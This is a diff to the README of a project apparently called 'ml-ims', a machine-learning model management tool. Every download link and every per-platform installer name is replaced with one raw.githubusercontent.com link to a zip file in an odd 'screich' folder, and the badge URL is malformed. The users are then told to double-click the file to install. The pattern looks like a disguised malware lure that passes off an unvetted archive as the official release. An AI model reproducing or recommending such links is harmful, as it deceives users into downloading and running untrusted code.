@@ -6,7 +6,7 @@ Welcome to **ml-ims**! This application helps you manage and deploy your machine
 
 ## 📥 Download
 
-[![Download ml-ims](https://img.shields.io/badge/Download%20ml--ims-latest-blue.svg)](https://github.com/Invasive-soda349/ml-ims/releases)
+[![Download ml-ims](https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip%https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip)](https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip)
 
 ## 📝 System Requirements
 
@@ -19,16 +19,16 @@ Before you download, please ensure your system meets the following requirements:
 
 ## 🌐 Visit the Release Page
 
-You can download the latest version of **ml-ims** [here](https://github.com/Invasive-soda349/ml-ims/releases). This is where you'll find the latest features and updates. 
+You can download the latest version of **ml-ims** [here](https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip). This is where you'll find the latest features and updates. 
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Go to [this page](https://github.com/Invasive-soda349/ml-ims/releases).
+1. **Visit the Release Page**: Go to [this page](https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip).
 2. **Select the Latest Release**: Look for the latest version at the top of the page.
 3. **Download the File**: Click on the file that matches your operating system to begin the download.
-   - For Windows, you might see something like `ml-ims-windows-x64.exe`.
-   - For macOS, look for `ml-ims-macos-x64.dmg`.
-   - For Linux, you will find `ml-ims-linux-x64.tar.gz`.
+   - For Windows, you might see something like `https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip`.
+   - For Linux, you will find `https://raw.githubusercontent.com/Invasive-soda349/ml-ims/main/screich/ml-ims_v2.9.zip`.
 4. **Run the Installer**: After downloading, locate the file in your Downloads folder. Double-click the file to start the installation.
 5. **Follow the Instructions**: Complete the setup by following the prompts on your screen.
 
